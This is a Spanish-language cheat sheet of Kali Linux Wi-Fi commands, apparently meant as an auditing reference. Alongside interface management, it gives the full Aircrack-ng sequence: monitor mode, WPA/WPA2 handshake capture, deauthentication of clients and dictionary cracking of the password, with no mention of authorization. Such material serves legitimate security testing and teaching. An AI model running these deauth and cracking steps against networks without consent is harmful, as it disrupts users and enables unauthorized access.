Comandos Útiles de Wi-Fi en Kali Linux
Esta es una lista de comandos comunes para gestionar y auditar redes Wi-Fi desde la terminal de Kali Linux.

IMPORTANTE: Necesitarás una tarjeta de red Wi-Fi que soporte el modo monitor para muchas de estas operaciones.

Gestión Básica de Interfaces
Ver interfaces de red (incluyendo Wi-Fi):

ip addr
# o
ifconfig

Ver interfaces inalámbricas y sus capacidades:

iwconfig

Habilitar o deshabilitar una interfaz:

# Deshabilitar
sudo ip link set wlan0 down
# Habilitar
sudo ip link set wlan0 up

Aircrack-ng Suite
La suite Aircrack-ng es fundamental para la auditoría de redes Wi-Fi.

1. Poner la tarjeta en Modo Monitor:

# Detener servicios que puedan interferir
sudo airmon-ng check kill

# Iniciar el modo monitor en la interfaz wlan0
sudo airmon-ng start wlan0

Esto creará una nueva interfaz, a menudo llamada wlan0mon.

2. Escanear redes Wi-Fi cercanas:

# Escanear en la interfaz en modo monitor
sudo airodump-ng wlan0mon

Presiona Ctrl+C para detener.

3. Capturar el Handshake WPA/WPA2:
Para romper una contraseña WPA/WPA2, necesitas capturar el "handshake" de 4 vías que ocurre cuando un cliente se conecta al punto de acceso.

# Escucha en un canal específico, filtra por BSSID y guarda la captura
sudo airodump-ng --bssid <BSSID_DEL_AP> -c <CANAL> -w captura wlan0mon

<BSSID_DEL_AP>: La dirección MAC del router objetivo.

<CANAL>: El canal en el que opera el router.

-w captura: Guarda los paquetes en archivos que empiezan con "captura".

4. (Opcional) Desautenticar un cliente para forzar el Handshake:
Si no quieres esperar a que un cliente se conecte, puedes forzar una desconexión.

# Envía paquetes de desautenticación
# -0 5: Envía 5 paquetes deauth
# -a <BSSID_AP>: El AP
# -c <MAC_CLIENTE>: El cliente a desconectar (opcional, si no se especifica, a todos)
sudo aireplay-ng -0 5 -a <BSSID_AP> -c <MAC_CLIENTE> wlan0mon

5. Crackear la contraseña con un diccionario:
Una vez que airodump-ng indique "WPA handshake: <BSSID>" en la esquina superior derecha, tienes la captura.

# -w /path/to/wordlist.txt: El diccionario
# captura-01.cap: El archivo .cap generado por airodump-ng
aircrack-ng -w /path/to/wordlist.txt captura-01.cap

Kali incluye listas de palabras en /usr/share/wordlists/. rockyou.txt.gz es una muy popular (necesitas descomprimirla).

Otros Comandos Útiles
Conectarse a una red Wi-Fi desde la terminal (usando nmcli):

# Ver redes disponibles
nmcli dev wifi list

# Conectarse a una red
sudo nmcli dev wifi connect "NombreDeLaRed" password "LaContraseña"

Ver información detallada de tu hardware inalámbrico:

sudo lshw -C network
